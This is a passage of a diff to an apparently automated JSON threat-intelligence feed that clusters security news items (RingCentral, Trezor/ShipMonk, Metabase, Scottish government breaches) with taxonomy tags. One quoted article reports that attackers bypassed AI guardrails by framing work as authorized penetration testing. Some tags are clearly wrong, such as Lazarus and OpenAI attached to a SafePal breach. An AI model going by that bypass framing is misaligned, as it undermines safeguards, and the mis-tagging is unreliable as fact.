Novel macOS Infostealer AmnesiaStealer Spread via ClickFix News 14 August 2026 4 Exposed AWS Access Key Linked to Data Breach Affecting 1500+ UK Charities News 13 August 2026 5 Lazarus Used Post-Quantum Key Exchange to Deliver Zero-Day News 12 August 2026 6 NIST Seeks Public Input on AI-Ready NVD Modernization News 12 August 2026 1 OpenAI Launches Two-Tier Security Access Program A",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "phishing_social_eng",
+            "credential_theft",
+            "zero_day",
+            "data_breach"
+          ],
+          "actor_attribution": [
+            "Lazarus"
+          ],
+          "affected_industries": [
+            "financial_services",
+            "government",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [
+            "Apple iOS/macOS",
+            "AWS",
+            "OpenAI/ChatGPT"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day"
+          ],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Apple iOS/macOS": "target",
+            "AWS": "target",
+            "OpenAI/ChatGPT": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "SafePal Data Breach Hits Tens of Thousands of Customers",
+          "link": "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
+          "published": "2026-08-17T09:10:00+00:00",
+          "summary": "Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach",
+          "taxonomy": {
+            "threat_categories": [
+              "phishing_social_eng",
+              "credential_theft",
+              "zero_day",
+              "data_breach"
+            ],
+            "actor_attribution": [
+              "Lazarus"
+            ],
+            "affected_industries": [
+              "financial_services",
+              "government",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [
+              "Apple iOS/macOS",
+              "AWS",
+              "OpenAI/ChatGPT"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Apple iOS/macOS": "target",
+              "AWS": "target",
+              "OpenAI/ChatGPT": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -7326,29 +7687,15 @@
       "strong_signals": [],
       "taxonomy": {
         "threat_categories": [
-          "data_breach",
-          "phishing_social_eng",
-          "ransomware_extortion",
-          "zero_day"
+          "data_breach"
         ],
-        "actor_attribution": [
-          "ShinyHunters"
-        ],
-        "affected_industries": [
-          "financial_services"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS",
-          "Fortinet",
-          "VMware"
-        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
-        "urgency_signals": [
-          "no_patch_yet",
-          "zero_day"
-        ],
+        "urgency_signals": [],
         "content_type": [
           "incident_report"
         ],
@@ -7363,42 +7710,22 @@
         "link": "https://www.securityweek.com/1-6-million-likely-impacted-by-ringcentral-data-breach/",
         "published": "2026-08-14T10:24:03+00:00",
         "summary": "The hackers published the allegedly stolen information, including names, addresses, email addresses, and phone numbers. The post 1.6 Million Likely Impacted by RingCentral Data Breach appeared first on SecurityWeek .",
-        "full_body": "The personal information of 1.6 million individuals appears to have been stolen from the widely used business communications platform RingCentral by a notorious extortion group. The incident occurred in July and was the result of a “sophisticated social engineering campaign”, RingCentral said in a notice on its website. “Upon detection, we promptly took steps to stop the unauthorized activity and immediately began an investigation with assistance from a leading third-party forensic firm. We have not seen any new unauthorized activity since taking these remediation efforts,” the company said. According to RingCentral, only a limited portion of its customers was affected by the attack, and those individuals were notified directly. “If you are not contacted by RingCentral, you are not affected. This incident did not impact the core RingCentral platform, and our services continue to operate without disruption,” it said. While RingCentral did not name the attackers, the ShinyHunters extortion group added the company to its Tor-based leak site in late July, claiming it stole over 623 gigabytes of data. Advertisement. Scroll to continue reading. Roughly a week later, as RingCentral did not succumb to the extortionists’ demands, ShinyHunters published a 280GB archive containing the data allegedly stolen from the company. On Thursday, data breach reporting site HaveIBeenPwned added the leaked information to its database, saying that it includes approximately 1.6 million unique email addresses, accompanied by names, addresses, and phone numbers. RingCentral hacked by ShinyHunters RingCentral has yet to confirm the attackers’ claims and the number of potentially impacted individuals. RingCentral is a cloud-based provider of unified communications and contact center solutions. Its platform delivers business phone, team messaging, video meetings, and AI-assisted tools for employee collaboration and customer interactions. Responding to a SecurityWeek inquiry, a RingCentral spokesperson provided the following statement: “RingCentral recently addressed a social engineering incident that affected a limited number of customers. Upon detection, we promptly took steps to stop the unauthorized activity and have not seen any new unauthorized activity since taking these efforts. We also began an investigation with assistance from a third-party forensic firm to investigate what happened and what data may have been impacted. This incident did not impact the RingCentral core platform and our services continue to operate without disruption. The investigation is ongoing, and we are communicating with customers as appropriate.” *Updated with statement from RingCentral. Related: 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Related: AmnesiaStealer macOS Malware Steals Data, Controls Browser Sessions Related: River Bank Says Hackers Deleted Data Stolen in Ransomware Attack Related: Brinks Home Discloses Data Breach as Hackers Leak Files Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Hackers Exploiting Unpatched GeoServer Zero-Day AmnesiaStealer macOS Malware Steals Data, Controls Browser Sessions Adobe Commerce Bug Targeted Immediately After Disclosure WordPress 7.0.4 Patches Remote Code Execution Vulnerability Fortinet Patches Authentication Flaws in FortiWeb and FortiManager Critical VMware vCenter Vulnerability in Attackers’ Crosshairs Nightmare Eclipse Drops Windows Zero-Day Exploit ‘ShieldBreak’ Latest News 40,000 Impacted by SafePal Data Breach Recent macOS Screen Sharing Vulnerability Exploited in Attacks Critical SAP Commerce Cloud Vulnerability Exploited 3 Days After Disclosure Fortune 500 Companies Hit in Azure Data Theft Campaign In Other News: Rapid7 Layoffs, Hacking a B",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
           "threat_categories": [
-            "ransomware_extortion",
-            "phishing_social_eng",
-            "zero_day",
             "data_breach"
           ],
-          "actor_attribution": [
-            "ShinyHunters"
-          ],
-          "affected_industries": [
-            "financial_services"
-          ],
-          "affected_products": [
-            "Fortinet",
-            "Apple iOS/macOS",
-            "VMware"
-          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day",
-            "no_patch_yet"
-          ],
+          "urgency_signals": [],
           "content_type": "incident_report",
           "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Fortinet": "target",
-            "Apple iOS/macOS": "target",
-            "VMware": "target",
-            "WordPress": "target",
-            "Azure": "target"
-          },
+          "role_map": {},
           "weak_tags": {
             "products": []
           }
@@ -7414,38 +7741,18 @@
           "summary": "The hackers published the allegedly stolen information, including names, addresses, email addresses, and phone numbers. The post 1.6 Million Likely Impacted by RingCentral Data Breach appeared first on SecurityWeek .",
           "taxonomy": {
             "threat_categories": [
-              "ransomware_extortion",
-              "phishing_social_eng",
-              "zero_day",
               "data_breach"
             ],
-            "actor_attribution": [
-              "ShinyHunters"
-            ],
-            "affected_industries": [
-              "financial_services"
-            ],
-            "affected_products": [
-              "Fortinet",
-              "Apple iOS/macOS",
-              "VMware"
-            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day",
-              "no_patch_yet"
-            ],
+            "urgency_signals": [],
             "content_type": "incident_report",
             "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Fortinet": "target",
-              "Apple iOS/macOS": "target",
-              "VMware": "target",
-              "WordPress": "target",
-              "Azure": "target"
-            },
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -7461,30 +7768,15 @@
       "strong_signals": [],
       "taxonomy": {
         "threat_categories": [
-          "data_breach",
-          "phishing_social_eng",
-          "ransomware_extortion",
-          "zero_day"
+          "data_breach"
         ],
-        "actor_attribution": [
-          "ShinyHunters"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "healthcare"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS",
-          "Fortinet",
-          "Google Cloud"
-        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
-        "urgency_signals": [
-          "no_patch_yet",
-          "zero_day"
-        ],
+        "urgency_signals": [],
         "content_type": [
           "incident_report"
         ],
@@ -7499,44 +7791,22 @@
         "link": "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/",
         "published": "2026-08-14T08:16:00+00:00",
         "summary": "Hackers stole the customers’ shipping information, including names, addresses, email addresses, and phone numbers. The post 14,000 Trezor Customers Impacted by Data Breach at ShipMonk appeared first on SecurityWeek .",
-        "full_body": "Hardware crypto wallet provider Trezor says the personal information of nearly 14,000 people was compromised in a data breach. The incident, it says, did not involve Trezor’s systems but rather its third-party shipping provider, ShipMonk. Trezor was notified of the attack on August 10. Customers in the US, the UK, Sweden, Colombia, Brazil, Italy, and Portugal who placed orders between May 10 and August 8 were affected. “We’re extremely sorry to inform our community that customer personal information, including full names, phone numbers, email addresses, and shipping addresses, has been accessed by an unauthorized actor during this breach,” Trezor says in a notice . Hackers stole the names, addresses, email addresses, and phone numbers of 11,742 customers, as well as the names, cities, and email addresses of 1,947 customers. Trezor shared the information with ShipMonk for order delivery purposes. “The breach is limited due to Trezor’s strict 90-day data storage policy (we were also able to negotiate the same terms with fulfillment partners, who follow the same policy),” the company says, but notes that for the 1,947 customers with partial exposure, older orders might have been accessed as well. Advertisement. Scroll to continue reading. “To be clear, our systems were not compromised, and your Trezor device is secure, but the affected customers might be targeted by more sophisticated phishing attempts,” the company says. Trezor notified all impacted customers via email and advised them to be wary of suspicious communication that requests personal information or prompts for immediate action. The company says it is in direct contact with ShipMonk to establish an exact timeline of events and determine the full scope of the data breach. ShipMonk reportedly notified customers that hackers accessed customer data by exploiting a vulnerability in Metabase. The targeted bug is likely the SQL injection zero-day that Metabase patched last week. The notorious extortion group ShinyHunters claimed responsibility for an attack on Metabase. On Wednesday, the group leaked data allegedly stolen from the data analytics solutions provider. ShipMonk has yet to acknowledge the incident publicly. It is unclear how many companies might have been affected, whether other individuals’ personal information was stolen, and who was behind the attack. SecurityWeek has emailed ShipMonk for a statement on the data breach and will update this article if the company responds. Related: Ceva Logistics Operations Disrupted by Cyberattack Related: Corporate Data Stolen in Levi Strauss Cyberattack Related: 3.8 Million Impacted by Unlimited Technology Systems Data Breach Related: 311,000 Impacted by Brown Health Medical Group-MA Data Breach Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Hackers Exploiting Unpatched GeoServer Zero-Day AmnesiaStealer macOS Malware Steals Data, Controls Browser Sessions Adobe Commerce Bug Targeted Immediately After Disclosure WordPress 7.0.4 Patches Remote Code Execution Vulnerability Fortinet Patches Authentication Flaws in FortiWeb and FortiManager Critical VMware vCenter Vulnerability in Attackers’ Crosshairs Nightmare Eclipse Drops Windows Zero-Day Exploit ‘ShieldBreak’ Mindgard Raises $30 Million to Protect AI Systems Latest News 40,000 Impacted by SafePal Data Breach Recent macOS Screen Sharing Vulnerability Exploited in Attacks Critical SAP Commerce Cloud Vulnerability Exploited 3 Days After Disclosure Fortune 500 Companies Hit in Azure Data Theft Campaign In Other News: Rapid7 Layoffs, Hacking a Boeing 737, Refrigeration System Vulnerabilities Trivy, Not LiteLLM Behind the 2,500 Org Compromise Google Cloud Sets Out Post-Quantum Roadmap With 2029 Readiness Goal 1.6 Million Likely Impacted by RingCentral Data Breach Trending Daily",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
           "threat_categories": [
-            "ransomware_extortion",
-            "phishing_social_eng",
-            "zero_day",
             "data_breach"
           ],
-          "actor_attribution": [
-            "ShinyHunters"
-          ],
-          "affected_industries": [
-            "healthcare",
-            "financial_services"
-          ],
-          "affected_products": [
-            "Google Cloud",
-            "Fortinet",
-            "Apple iOS/macOS"
-          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day",
-            "no_patch_yet"
-          ],
+          "urgency_signals": [],
           "content_type": "incident_report",
           "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Google Cloud": "target",
-            "Fortinet": "target",
-            "Apple iOS/macOS": "target",
-            "VMware": "target",
-            "WordPress": "target",
-            "Azure": "target"
-          },
+          "role_map": {},
           "weak_tags": {
             "products": []
           }
@@ -7552,40 +7822,18 @@
           "summary": "Hackers stole the customers’ shipping information, including names, addresses, email addresses, and phone numbers. The post 14,000 Trezor Customers Impacted by Data Breach at ShipMonk appeared first on SecurityWeek .",
           "taxonomy": {
             "threat_categories": [
-              "ransomware_extortion",
-              "phishing_social_eng",
-              "zero_day",
               "data_breach"
             ],
-            "actor_attribution": [
-              "ShinyHunters"
-            ],
-            "affected_industries": [
-              "healthcare",
-              "financial_services"
-            ],
-            "affected_products": [
-              "Google Cloud",
-              "Fortinet",
-              "Apple iOS/macOS"
-            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day",
-              "no_patch_yet"
-            ],
+            "urgency_signals": [],
             "content_type": "incident_report",
             "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Google Cloud": "target",
-              "Fortinet": "target",
-              "Apple iOS/macOS": "target",
-              "VMware": "target",
-              "WordPress": "target",
-              "Azure": "target"
-            },
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -7600,21 +7848,12 @@
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [
-          "apt_espionage",
-          "supply_chain"
-        ],
+        "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [
-          "critical_infrastructure",
-          "financial_services",
           "government"
         ],
-        "affected_products": [
-          "Anthropic/Claude",
-          "GitHub",
-          "OpenAI/ChatGPT"
-        ],
+        "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
@@ -7633,35 +7872,22 @@
         "link": "https://cyberscoop.com/near-autonomous-ai-attack-government-target-taiwan/",
         "published": "2026-08-12T17:05:01+00:00",
         "summary": "Israeli cyber firm Dream said the framework adapted mid-operation, corrected its mistakes and expanded as it went along. The post Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan appeared first on CyberScoop .",
-        "full_body": "Advertisement Get our latest cybersecurity news first on Google. Click here! Close Suspected Chinese hackers used open-source artificial intelligence models to run a cyberattack against the Taiwanese government in the first publicly known case of an autonomous AI hack hitting a government target, according to research published Wednesday. The hackers extracted more than 2,500 personnel records, among other data, in the “near-autonomous attack,” researchers at Israeli cyber firm Dream wrote in a blog post . The attackers set up the framework so that it could “adapt mid-operation without human intervention.” The framework “implements dedicated research phases it calls ‘Learning Cycles’ — autonomous sessions where the AI system searches vulnerability databases, GitHub repositories, and security research publications for techniques specifically applicable to its target government’s infrastructure,” the post reads. And then it kept going. Advertisement “The attacker didn’t stop at primary targets,” Dream said. “It expanded the operation to government IT supply chain vendors, a nuclear safety agency, a government email system, and 7+ energy sector companies — scanning them all in parallel for misconfigurations, exposed admin interfaces, and exploitable vulnerabilities.” It also learned from its mistakes as it went on, Dream said in identifying what stood out about the campaign. Autonomous AI-powered cyberattacks have raised alarms in the past: Anthropic reported last fall that it stopped the first autonomous cyber espionage campaign, although researchers noted that the “autonomous” campaign still required significant human work . The Financial Times first reported the Dream research and details on the target. The hackers used two popular open-source AI frameworks, Hermes and OpenClaw, to set up the Taiwan operation. They bypassed safety guardrails by framing the work as authorized penetration testing, according to Dream. Advertisement The firm discovered the operation via an online archive of 160 megabytes and nearly 1,400 files, revealing “a multi-agent AI system that achieved confirmed, real-world compromises against state infrastructure.” As with the autonomous cyber espionage campaign uncovered last fall, the attack Dream examined also noted the need for human tinkering. “We increasingly see threat actors leveraging AI for autonomous offensive operations,” the company wrote. “But building a system that actually works at this level takes more work than ‘just’ running a model. It demands careful adjustment to the specific task, optimization of agent coordination, and fine-tuning of decision logic — the kind of sophistication evident in this framework’s Bayesian prioritization, self-correction loops, and adaptive research cycles.” Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops In a pair of blogs posted Monday, OpenAI said it was updating its Daybreak program – which provides unreleased frontier models to private organizations and governments for defensive cybersecurity work – and introducing a new model variant. (Photo by Samuel Boivin/NurPhoto via Getty Images) (Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity The world still treats bug hunters like criminals The SOC wasn’t built for this Why Cybersecurity is at the heart of the US-China AI race Government Trump turns to private sector in offensive hacking operations memo Federal judge issues second order blocking Trump mail-in voting directive The FTC wants to regulate AI for ideological bias NATO and an AI startup can now name and track software vulnerabilities Technology How companies could share cyber risks without exposing their secrets Sen. Wyden urges feds to discard older, insecure, public-facing VPNs White House accuses Chinese company of distilling Anthropic’s Fable OpenAI says model test was behind Hugging Face hack Threats Kimwolf bot",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
-          "threat_categories": [
-            "supply_chain",
-            "apt_espionage"
-          ],
+          "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [
-            "financial_services",
-            "government",
-            "critical_infrastructure"
+            "government"
           ],
-          "affected_products": [
-            "OpenAI/ChatGPT",
-            "GitHub",
-            "Anthropic/Claude"
-          ],
+          "affected_products": [],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "incident_report",
           "confidence_tier": "tier_4_news",
-          "role_map": {
-            "OpenAI/ChatGPT": "target",
-            "GitHub": "target",
-            "Anthropic/Claude": "target"
-          },
+          "role_map": {},
           "weak_tags": {
             "products": []
           }
@@ -7676,32 +7902,19 @@
           "published": "2026-08-12T17:05:01+00:00",
           "summary": "Israeli cyber firm Dream said the framework adapted mid-operation, corrected its mistakes and expanded as it went along. The post Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan appeared first on CyberScoop .",
           "taxonomy": {
-            "threat_categories": [
-              "supply_chain",
-              "apt_espionage"
-            ],
+            "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [
-              "financial_services",
-              "government",
-              "critical_infrastructure"
+              "government"
             ],
-            "affected_products": [
-              "OpenAI/ChatGPT",
-              "GitHub",
-              "Anthropic/Claude"
-            ],
+            "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "incident_report",
             "confidence_tier": "tier_4_news",
-            "role_map": {
-              "OpenAI/ChatGPT": "target",
-              "GitHub": "target",
-              "Anthropic/Claude": "target"
-            },
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -7785,46 +7998,54 @@
       ]
     },
     {
-      "cluster_id": "3b8dca7ee7",
+      "cluster_id": "2c8acd9c63",
       "priority_score": 8,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "data_breach"
+        ],
         "actor_attribution": [],
-        "affected_industries": [],
+        "affected_industries": [
+          "government"
+        ],
         "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [],
         "content_type": [
-          "vulnerability_disclosure"
+          "incident_report"
         ],
         "confidence_tier": [
           "tier_4_news"
         ]
       },
       "primary": {
-        "source": "Infosecurity Magazine",
+        "source": "Dark Reading",
         "cohort": "cyber_news_breach_reporting",
-        "title": "Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant",
-        "link": "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
-        "published": "2026-08-10T15:30:00+00:00",
-        "summary": "Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data",
+        "title": "Scottish Govt Suffers Potentially Widening Data Breach at Prosecutor's Office",
+        "link": "https://www.darkreading.com/cyberattacks-data-breaches/scottish-govt-data-breach-prosecutors-office",
+        "published": "2026-08-14T15:58:50+00:00",
+        "summary": "One Caledonian government agency reported a breach, thanks to a third party that may have serviced other agencies as well.",
         "full_body": "",
         "fetch_status": "not_attempted",
         "taxonomy": {
-          "threat_categories": [],
+          "threat_categories": [
+            "data_breach"
+          ],
           "actor_attribution": [],
-          "affected_industries": [],
+          "affected_industries": [
+            "government"
+          ],
           "affected_products": [],
           "tools_used": [],
           "cve_ids": [],
           "attack_techniques": [],
           "urgency_signals": [],
-          "content_type": "vulnerability_disclosure",
+          "content_type": "incident_report",
           "confidence_tier": "tier_4_news",
           "role_map": {},
           "weak_tags": {
@@ -7834,22 +8055,113 @@
       },
       "corroborating_sources": [
         {
-          "source": "Infosecurity Magazine",
+          "source": "Dark Reading",
           "cohort": "cyber_news_breach_reporting",
-          "title": "Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant",
-          "link": "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
-          "published": "2026-08-10T15:30:00+00:00",
-          "summary": "Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data",
+          "title": "Scottish Govt Suffers Potentially Widening Data Breach at Prosecutor's Office",
+          "link": "https://www.darkreading.com/cyberattacks-data-breaches/scottish-govt-data-breach-prosecutors-office",
+          "published": "2026-08-14T15:58:50+00:00",
+          "summary": "One Caledonian government agency reported a breach, thanks to a third party that may have serviced other agencies as well.",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "f92fe3a8b7",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Dark Reading",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Metabase SQL Zero-Day Attacks Could Have Wide Blast Radius",
+        "link": "https://www.darkreading.com/vulnerabilities-threats/metabase-sql-zero-day-attacks-wide-blast-radius",
+        "published": "2026-08-10T21:02:23+00:00",
+        "summary": "The maximum-severity vulnerability, which still has no CVE, allows malicious, remote administrator access to the business-analytics platform and its downstream users.",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Metabase SQL Zero-Day Attacks Could Have Wide Blast Radius",
+          "link": "https://www.darkreading.com/vulnerabilities-threats/metabase-sql-zero-day-attacks-wide-blast-radius",
+          "published": "2026-08-10T21:02:23+00:00",
+          "summary": "The maximum-severity vulnerability, which still has no CVE, allows malicious, remote administrator access to the business-analytics platform and its downstream users.",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day"
+            ],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "news_report",
             "confidence_tier": "tier_4_news",
             "role_map": {},
             "weak_tags": {
@@ -8117,6 +8429,81 @@
       ]
     },
     {
+      "cluster_id": "3b8dca7ee7",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant",
+        "link": "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
+        "published": "2026-08-10T15:30:00+00:00",
+        "summary": "Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant",
+          "link": "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
+          "published": "2026-08-10T15:30:00+00:00",
+          "summary": "Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "0ba078ff35",
       "priority_score": 8,
       "member_count": 1,
@@ -8318,62 +8705,6 @@
   ],
   "affinity_groups": [
     {
-      "label": "data breach targeting Apple iOS/macOS",
-      "anchor_signal": "Apple iOS/macOS",
-      "theme_key": "apple-ios-macos",
-      "dominant_features": {
-        "threat_categories": [
-          "data_breach",
-          "zero_day",
-          "phishing_social_eng",
-          "ransomware_extortion"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "government"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS",
-          "Fortinet"
-        ],
-        "urgency_signals": [
-          "zero_day",
-          "no_patch_yet"
-        ]
-      },
-      "cluster_count": 7,
-      "article_count": 14,
-      "cohesion": 0.238,
-      "shared_strong_signals": [
-        "Apple iOS/macOS"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "cb8fdf38e7",
-        "e3235a03c3",
-        "927bf94c9b",
-        "1ac2c2cb37",
-        "20c2a82904",
-        "b3aa07bd4c",
-        "a06704d870"
-      ],
-      "links": [
-        "https://orca.security/resources/research-pod/zoom-zero-click-rce-vulnerability-orca-security/",
-        "https://securelist.com/malware-report-q2-2026-pc-iot-statistics/120960/",
-        "https://www.securityweek.com/recent-macos-screen-sharing-vulnerability-exploited-in-attacks/",
-        "https://www.bleepingcomputer.com/news/security/hackers-exploit-macos-screen-sharing-flaw-to-deploy-monero-miner/",
-        "https://risky.biz/RBNEWS600/",
-        "https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/",
-        "https://www.securityweek.com/critical-sap-commerce-cloud-vulnerability-exploited-3-days-after-disclosure/",
-        "https://thehackernews.com/2026/08/sap-commerce-cloud-flaw-could-let.html",
-        "https://www.securityweek.com/40000-impacted-by-safepal-data-breach/",
-        "https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/",
-        "https://www.securityweek.com/1-6-million-likely-impacted-by-ringcentral-data-breach/",
-        "https://www.securityweek.com/14000-trezor-customers-impacted-by-data-breach-at-shipmonk/"
-      ]
-    },
-    {
       "label": "Microsoft SharePoint exploitation (CVE-2026-68820)",
       "anchor_signal": "Microsoft SharePoint",
       "theme_key": "microsoft-sharepoint",
@@ -8383,10 +8714,14 @@
           "zero_day"
         ],
         "affected_products": [
-          "Microsoft SharePoint"
+          "Microsoft SharePoint",
+          "Azure"
         ],
         "cve_ids": [
           "CVE-2026-68820",
+          "CVE-2026-62832",
+          "CVE-2026-62815",
+          "CVE-2026-62878",
           "CVE-2026-62893"
         ],
         "urgency_signals": [
@@ -8395,9 +8730,9 @@
           "preauth_unauth"
         ]
       },
-      "cluster_count": 7,
-      "article_count": 11,
-      "cohesion": 0.219,
+      "cluster_count": 8,
+      "article_count": 12,
